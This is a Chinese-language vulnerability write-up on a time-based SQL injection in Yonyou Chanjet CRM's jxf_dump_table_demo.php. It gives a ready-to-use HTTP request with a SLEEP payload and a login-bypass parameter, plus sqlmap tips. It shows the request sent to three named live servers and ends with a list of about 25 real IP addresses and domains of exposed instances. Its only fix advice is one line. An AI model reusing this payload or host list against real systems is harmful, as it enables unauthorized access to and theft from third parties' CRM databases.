## 用友畅捷通CRM jxf_dump_table_demoSQL注入漏洞


 

一、 **漏洞描述**

畅捷通信息技术股份有限公司畅捷通存在SQL注入，攻击者可以利用此漏洞 进行信息获取。

二、 **漏洞影响**

畅捷通CRM

该漏洞比较特殊，不能携带cookie，复现burp 以及sqlmap都不能携带cookie！直接用我的poc测试！！漏洞对网络要求较高

**三、漏洞复现**

## **复现一**

**I****p：http://****111.206.233.35:8089**

构造poc

GET /tools/jxf_dump_table_demo.php?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-&DontCheckLogin=1 HTTP/1.1

Host: 111.206.233.35:8089

Connection: close

（3）[](https://220.167.89.48:8443)手工验证，睡眠2秒

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps14.jpg) 

Sqlmap确认有漏洞  ，该漏洞比较特殊，不能携带cookie跑sqlmap，用我的poc -r然后别用sqlmap自定义的cookie   用*标记注入点

Python sqlmap.py -r

Cookie这里要选n

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps15.jpg) 

302 选 n

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps16.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps17.jpg) 

Sqlmap确认有漏洞

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps18.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps19.jpg) 

## **复现二**

**I****p：**http://shcsy.ufyct.com:8000

（2）构造poc,如下，成功验证存在sql注入漏洞

POC:

GET /tools/jxf_dump_table_demo.php?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-&DontCheckLogin=1 HTTP/1.1

Host: shcsy.ufyct.com:8000

Connection: close

（3）手工验证，睡眠

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps20.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps21.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps22.jpg) 

## **复现三**

**I****p：http://**124.71.22.118:8000

（2）构造poc,如下，成功验证存在sql注入漏洞

POC:

GET /tools/jxf_dump_table_demo.php?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-&DontCheckLogin=1 HTTP/1.1

Host: 124.71.22.118:8000

Connection: close

（3）手工验证

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps23.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps24.jpg) 

![](file:///C:\Users\BeiChu\AppData\Local\Temp\ksohtml80940\wps25.jpg) 

## **其余I****P****地址：**

http://ecs-124-71-22-118.compute.hwclouds-dns.com:8000

http://116.237.71.147:8000

http://180.172.75.165:8888/

http://mlylqc.ufyct.com:8000

http://116.237.35.159:8000

http://47.120.51.105:8090/

https://cshyqdzkj.gnway.cc

http://111.206.233.35:8089

http://shcsy.ufyct.com:8000

http://125.123.66.85:8000

http://116.237.35.159:8000

http://shcsy.ufyct.com:8000

http://49.4.122.252:8090

http://125.123.66.81:8000

http://118.212.70.254:8000

http://159.75.254.78:66

http://222.128.95.39:8080

http://103.159.124.70:8200

http://27.152.154.53:8090

http://47.119.204.208:66

http://118.212.70.33:8000

http://118.212.70.86:8000

http://14.19.178.68:9090

http://124.71.22.118:8000

http://110.87.107.101:8090

http://mlylqc.ufyct.com:8000

# **修复建议：**

对参数进行过滤，防止sql注入。